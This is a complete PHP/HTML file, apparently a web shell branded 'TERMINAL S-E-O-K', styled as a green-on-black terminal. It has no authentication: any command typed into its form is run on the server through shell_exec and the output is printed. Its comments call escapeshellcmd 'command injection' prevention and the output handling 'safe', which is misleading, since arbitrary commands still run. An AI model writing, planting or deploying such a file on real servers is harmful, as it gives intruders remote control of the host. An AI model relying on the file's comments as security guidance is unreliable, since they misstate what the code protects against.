<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Command Line</title>
    <style>
        body {
            background-color: #000;
            color: #30f25a;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            color: red;
            font-size: 2em;
        }
        form {
            margin: 20px 0;
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            border: 1px solid #30f25a;
            background-color: #222;
            color: #30f25a;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            color: #000;
            background-color: #30f25a;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #27a947;
        }
        pre {
            background-color: #222;
            color: #30f25a;
            padding: 10px;
            border: 1px solid #30f25a;
            border-radius: 5px;
            text-align: left;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <h1>TERMINAL S-E-O-K</h1>
    <form method="POST" action="">
        <input type="text" name="cmd" placeholder="Enter a command (e.g., ls, dir)" required>
        <button type="submit">Execute</button>
    </form>
    <h2>Output:</h2>
    <pre>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    // Get the command from user input
    $command = escapeshellcmd($_POST['cmd']); // Prevent command injection
    $output = shell_exec($command); // Execute the command
    echo htmlspecialchars($output); // Display the output safely
}
?>
    </pre>
</body>
</html>
